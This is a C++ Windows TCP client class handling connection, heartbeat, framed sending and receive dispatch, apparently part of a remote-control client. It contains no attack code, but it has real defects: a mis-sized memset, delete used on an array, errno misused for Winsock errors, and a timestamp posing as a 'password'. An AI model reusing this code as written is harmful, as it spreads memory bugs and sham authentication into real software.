#include "stdafx.h"
#include "TcpSocket.h"




CTcpSocket::CTcpSocket(void)
{
	Trace("%s\n", __FUNCTION__);
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	m_Socket = INVALID_SOCKET;
	m_hWorkerThread = NULL;
	m_hThreadHeartWorker = NULL;
	activetime = 0;
}



CTcpSocket::~CTcpSocket(void)
{
	Sleep(100);
	if (m_hWorkerThread)
		CloseHandle(m_hWorkerThread);
	if (m_hThreadHeartWorker)
		CloseHandle(m_hThreadHeartWorker);
	if (m_hEvent)
		CloseHandle(m_hEvent);
	WSACleanup();
	m_CompressionBuffer.FreeBuffer();
	m_DeCompressionBuffer.FreeBuffer();
	m_WriteBuffer.FreeBuffer();
}


void CTcpSocket::Disconnect()
{
	Trace("%s\n", __FUNCTION__);
	if (!m_bIsRunning)
		return;
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char*)&lingerStruct, sizeof(lingerStruct));
	CancelIo((HANDLE)m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	closesocket(m_Socket);
	SetEvent(m_hEvent);
	m_Socket = INVALID_SOCKET;

}

bool CTcpSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{

	Trace("%s\n", __FUNCTION__);
	ResetEvent(m_hEvent);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	activetime = timeGetTime();
	ZeroMemory(m_password, 10);
	memcpy(m_password, &activetime, 8);
	m_password[8]= TOKEN_ACTIVED;
#ifdef _WIN64
	m_password[9] = 1;
#else
	m_password[9] = 0;
#endif
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (m_Socket == SOCKET_ERROR)
	{
		return false;
	}

	hostent* pHostent = NULL;
	int len = WideCharToMultiByte(CP_ACP, 0, lpszHost, lstrlen(lpszHost), NULL, 0, NULL, NULL);
	char* cstr = new char[len + 1];
	WideCharToMultiByte(CP_ACP, 0, lpszHost, lstrlen(lpszHost), cstr, len, NULL, NULL);
	cstr[len] = '\0';
	pHostent = gethostbyname(cstr);
	delete cstr;

	if (pHostent == NULL)
	{
		return false;
	}
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);
	if (connect(m_Socket, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	{
		return false;
	}
	int size = MAX_SEND_BUFFER;
	setsockopt(m_Socket, SOL_SOCKET, SO_SNDBUF, (CHAR*)&size, sizeof(int));
	size = MAX_RECV_BUFFER;
	setsockopt(m_Socket, SOL_SOCKET, SO_RCVBUF, (CHAR*)&size, sizeof(int));

	int nNetTimeout =30*1000;
	setsockopt(m_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&nNetTimeout, sizeof(int));
	
	BOOL   bConditionalAccept = TRUE;
	DWORD  dwBytes;
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl(m_Socket, SIO_KEEPALIVE_VALS, &klive, sizeof(tcp_keepalive), NULL, 0, &dwBytes, 0, NULL);
	}

	InterlockedExchange((LPLONG)&m_bIsRunning, TRUE);
	UINT	dwThreadId = 0;
	m_hWorkerThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, (CTcpSocket*)this, 0, &dwThreadId);
	UINT  nThreadID;
	m_hThreadHeartWorker = (HANDLE)_beginthreadex(NULL, 0, ThreadHeartbeat, (void*)this, 0, &nThreadID);
	return true;
}



unsigned  CTcpSocket::WorkThread(LPVOID lparam)
{
	Trace("%s\n", __FUNCTION__);
	CTcpSocket* pThis = reinterpret_cast<CTcpSocket*>(lparam);

	char* buff = new char[MAX_RECV_BUFFER];
	memset(buff, 0, sizeof(buff));
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	fd_set fdRead = fdSocket;
	int nSize = 0; int nRet = 0;
	while (pThis->m_bIsRunning)
	{
		nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			nSize = recv(pThis->m_Socket, buff, MAX_RECV_BUFFER, 0);
			if (nSize <= 0)
			{
				if ((nSize < 0) && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR))
				{
					continue;//继续接收数据
				}
				else
				{
					pThis->Disconnect();
					break;
				}
			}
			if (nSize > 0)
			{
				pThis->OnReceive((LPBYTE)buff, nSize);
			}
		}
	}
	SAFE_DELETE_AR(buff)
		return -1;
}

unsigned CTcpSocket::ThreadHeartbeat(LPVOID thisContext)
{
	// Get back our pointer to the class
	CTcpSocket* pThis = reinterpret_cast<CTcpSocket*>(thisContext);
	ASSERT(pThis);
	BYTE Token = TOKEN_HEARTBEAT;
	while (pThis->m_bIsRunning)
	{
		for (int i = 0; i < 1000; i++)
		{
			if (pThis->m_bIsRunning)
				Sleep(10);
			else
				return 0;
		}
		pThis->Send(&Token, 1);
		if (timeGetTime() - pThis->activetime > 60000)
		{
			if (pThis->m_bIsRunning)
				pThis->Disconnect();
		}
	}
	return 0;
}


int CTcpSocket::Send(LPBYTE lpData, UINT nSize)
{
	m_clcs.lock();
	Trace("%s\n", __FUNCTION__);
	LONG nBufLen = nSize + 14;
	m_WriteBuffer.Write((PBYTE)&nBufLen, 4);  //总数据长度
	m_WriteBuffer.Write((PBYTE)m_password, 10);	//通信密码
	m_WriteBuffer.Write(lpData, nSize,1, m_password);						//数据
	SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
	m_WriteBuffer.ClearBuffer();
	m_clcs.unlock();
	return TRUE;
}

int CTcpSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int nRet = 0;
	const char* pbuf = (char*)lpData;
	int size = 0;
	int nSend = 0;
	int nSendRetry = 15;
	for (size = nSize; size >= (int)nSplitSize; size -= nSplitSize)
	{
		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
		pbuf += nSplitSize;
	}
	if (size > 0)
	{
		int i;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char*)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}


void CTcpSocket::run_event_loop()
{
	Trace("%s\n", __FUNCTION__);
	WaitForSingleObject(m_hEvent, INFINITE);
	Sleep(600);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	WaitForSingleObject(m_hWorkerThread, INFINITE);
	WaitForSingleObject(m_hThreadHeartWorker, INFINITE);
	m_pManager->bStop = TRUE;
	Sleep(300);
}


BOOL CTcpSocket::IsRunning()
{
	return m_bIsRunning;
}



bool CTcpSocket::OnReceive(const BYTE* pData, int iLength)
{
	Trace("%s\n", __FUNCTION__);
	m_CompressionBuffer.Write((LPBYTE)pData, iLength);
	while ((int)(m_CompressionBuffer.GetBufferLen()) > 14)
	{
		if ((memcmp(m_password, m_CompressionBuffer.GetBuffer(4), 10) != 0))
		{
			TRACE("%s  memcmp  baddata \r\n", __FUNCTION__);
			m_CompressionBuffer.ClearBuffer();
			return FALSE;
		}
		int nSize = 0;
		CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(0), sizeof(int));
		if (nSize && (int)m_CompressionBuffer.GetBufferLen() >= nSize)
		{
			if ( ((int)m_CompressionBuffer.GetBufferLen() < nSize))
			{
				TRACE("%s  memcmp  baddata \r\n", __FUNCTION__);
				m_CompressionBuffer.ClearBuffer();
				return FALSE;
			}
			activetime = timeGetTime();
			m_DeCompressionBuffer.ClearBuffer();								//清理旧数据
			m_DeCompressionBuffer.Write(m_CompressionBuffer.GetBuffer(14), nSize - 14,1, m_password);				//写入数据
			m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
			m_CompressionBuffer.Delete(nSize);
		}
		else
			break;
	}
	return true;
}


void CTcpSocket::setManagerCallBack(CManager* pManager)
{
	m_pManager = pManager;
}